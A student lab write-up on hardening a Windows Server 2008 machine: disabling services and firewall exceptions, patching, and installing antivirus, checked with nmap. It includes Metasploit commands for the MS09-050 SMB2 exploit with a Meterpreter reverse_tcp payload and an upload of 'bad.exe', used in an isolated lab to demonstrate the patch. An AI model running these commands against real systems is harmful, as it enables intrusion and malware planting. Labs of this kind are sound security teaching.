## Patching, Securing Systems, and Configuring Anti-Virus

### Tools
- netplwiz: Windows command for setting logs on paramaters
- gpedit.msc: Access Group Policy Management Console as part of Windows
- Event Viewer: stores log files that track computer activities
- Telnet: remote administration protocol via command line
- useradd: a command for adding users on Unix systems
- Nmap and Zenmap: show services running on host, Zenmap is the GUI version
- SMB: protocol for file sharing 

### Topology 
- Kali 2 Linux: 192.168.1.101
- Windows Server: 192.168.1.10
- Metasploitable: 192.168.1.30

### LAB
1. log in to Kali 2 Linux
2. run nmap scan on 192.168.1.10
<img width="417" height="691" alt="Screenshot 2026-05-04 at 6 22 50 PM" src="https://github.com/user-attachments/assets/69865171-6175-4235-a206-275723865f7f" />

4. log in to Windows Server
5. launch the Windows Services console
> services.msc
5. open FTP Publishing Service and Disable it
<img width="431" height="486" alt="Screenshot 2026-05-04 at 6 26 42 PM" src="https://github.com/user-attachments/assets/80db6fd9-4d36-4a8d-8163-84e2e0298e0b" />

6. also disable Simple TCP/IP Services and Telnet
7. open the Windows firewall
> firewall.cpl
8. change the settings
9. open the Exceptions tab
10. delete CHARGEN, DAYTIME, ECHO, and QOTD
<img width="590" height="385" alt="Screenshot 2026-05-04 at 6 31 00 PM" src="https://github.com/user-attachments/assets/301cbd2a-0e85-4a3d-970f-e99659807b98" />

11. uncheck FTP Server and Telnet
12. from the Kali 2 Linux, run nmap scan of 192.168.1.10
<img width="436" height="553" alt="Screenshot 2026-05-04 at 6 55 27 PM" src="https://github.com/user-attachments/assets/1ed0a48c-0e08-4b00-b3ca-2e27c882ea45" />

14. start the postgresql service
> service postgresql start
14. start Metasploit
> msfconsole
15. use the Windows Server 2008 exploit of SMB
> use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
16. set the remote host to 192.168.1.10 and the local host to 192.168.1.101
> set RHOST 192.168.1.10
>
> set LHOST 192.168.1.101
17. set the payload to reverse_tcp
> set payload windows/meterpreter/reverse_tcp
18. exploit the vulnerability
> exploit
19. from newly created session, upload bad.exe
> upload bad.exe c:\\\
<img width="1054" height="508" alt="Screenshot 2026-05-04 at 7 02 00 PM" src="https://github.com/user-attachments/assets/3fa0e9ad-23dc-4c9d-987e-2dce05e06326" />

20. exit session
21. open Windows Server
22. install the patch for the exploit, Windows6.0-KB975517-x86.msu
<img width="531" height="22" alt="Screenshot 2026-05-04 at 7 06 07 PM" src="https://github.com/user-attachments/assets/94aabe2f-3c4d-4f00-805f-e3cda23b0147" />

24. restart
25. try the same exploit from the Kali 2 Linux
<img width="547" height="148" alt="Screenshot 2026-05-04 at 7 09 34 PM" src="https://github.com/user-attachments/assets/a536aff5-b19e-4731-8f34-0a3b730353e1" />

27. install Microsoft Security Essentials
<img width="662" height="404" alt="Screenshot 2026-05-04 at 7 10 55 PM" src="https://github.com/user-attachments/assets/e4fddf32-5518-4126-9018-fdc377686703" />

29. restart
30. update Microsoft Security Essentials
31. open computer link on the start button and go into the Local Disk (C:) Drive
32. right click bad.exe and scan with Microsoft Security Essentials
33. Look at the malware variant
<img width="809" height="567" alt="Screenshot 2026-05-04 at 7 15 49 PM" src="https://github.com/user-attachments/assets/c658e5a1-b767-4a94-8bb0-e5c47181661a" />
